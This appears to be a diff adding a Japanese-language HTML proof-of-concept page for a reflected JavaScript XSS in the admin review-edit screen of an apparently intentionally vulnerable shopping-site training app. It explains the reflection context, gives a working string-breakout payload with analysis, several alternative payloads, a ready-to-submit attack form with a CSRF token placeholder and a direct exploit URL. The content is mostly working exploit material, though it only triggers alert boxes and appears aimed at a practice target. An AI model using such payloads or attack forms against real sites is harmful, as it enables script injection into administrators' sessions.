@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JavaScript Reflection XSS Attack</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>レビュー編集JavaScript反射XSS攻撃</h1>
+    
+    <h2>攻撃概要</h2>
+    <p>レビュー編集成功後のテロップ表示機能における複雑なJavaScript反射XSS攻撃です。</p>
+    
+    <h2>脆弱性の特徴</h2>
+    <ul>
+        <li>commentパラメータが複数箇所で反射</li>
+        <li>反射箇所間に変数定義が存在</li>
+        <li>&lt; と &gt; がブロックリスト</li>
+        <li>構文エラーを避ける高度なペイロードが必要</li>
+    </ul>
+    
+    <h2>JavaScript構造</h2>
+    <pre><code>
+console.log('[1つ目の反射]');
+
+var msg = '[変数定義でも反射]';
+
+showNotification('コメント：' + '[2つ目の反射]' + ' を書き込みました。');
+    </code></pre>
+    
+    <h2>攻撃ペイロード</h2>
+    <div style="border: 2px solid red; padding: 10px; background: #ffe6e6;">
+        <h3>⚠️ 成功ペイロード</h3>
+        <code>'));alert(1);var msg=//</code>
+    </div>
+    
+    <h2>ペイロード解析</h2>
+    <pre><code>
+# 1つ目の反射後:
+console.log(''));alert(1);var msg=//');
+#           ↑文字列終了 ↑alert実行 ↑var再定義 ↑コメント開始
+
+# 元の変数定義:  
+# var msg = ''));alert(1);var msg=//';
+#                              ↑↑ コメントで無効化
+
+# 結果: alert(1)が実行される
+    </code></pre>
+    
+    <h2>攻撃フォーム</h2>
+    <form action="https://vulnerable-shopping-mall21.vercel.app/admin/reviews/edit/32" method="POST" target="_blank">
+        <input type="hidden" name="csrf_token" value="REPLACE_WITH_VALID_TOKEN" />
+        <input type="hidden" name="rating" value="3" />
+        
+        <label>攻撃ペイロード:</label><br>
+        <input type="text" name="comment" value="'));alert(1);var msg=//" size="40" /><br><br>
+        
+        <button type="submit" style="background: red; color: white; padding: 10px;">
+            XSS攻撃実行
+        </button>
+    </form>
+    
+    <h2>その他のペイロード例</h2>
+    <ul>
+        <li><code>'));confirm('XSS');var msg=//</code></li>
+        <li><code>'));eval('alert(1)');var msg=//</code></li>
+        <li><code>'));window['alert'](1);var msg=//</code></li>
+        <li><code>'));document.location='javascript:alert(1)';var msg=//</code></li>
+    </ul>
+    
+    <h2>検証方法</h2>
+    <ol>
+        <li>有効なCSRFトークンを取得して上記フォームに設定</li>
+        <li>管理者でログインした状態でフォーム送信</li>
+        <li>レビュー管理画面リダイレクト時にalert()が発火</li>
+        <li>テロップ表示と同時にXSSが実行される</li>
+    </ol>
+    
+    <h2>直接アクセステスト</h2>
+    <p>以下のURLで直接テスト可能（管理者ログイン状態）:</p>
+    <a href="https://vulnerable-shopping-mall21.vercel.app/admin/reviews?updated_comment='));alert(1);var%20msg=//" target="_blank">
+        XSSテストURL
+    </a>
+    
+    <script>
+        // CSRFトークン設定の注意喚起
+        window.onload = function() {
+            alert('攻撃前に有効なCSRFトークンを設定してください!\n\n1. /contact ページでトークン取得\n2. フォームのREPLACE_WITH_VALID_TOKENを置き換え');
+        };
+    </script>
+</body>
+</html>
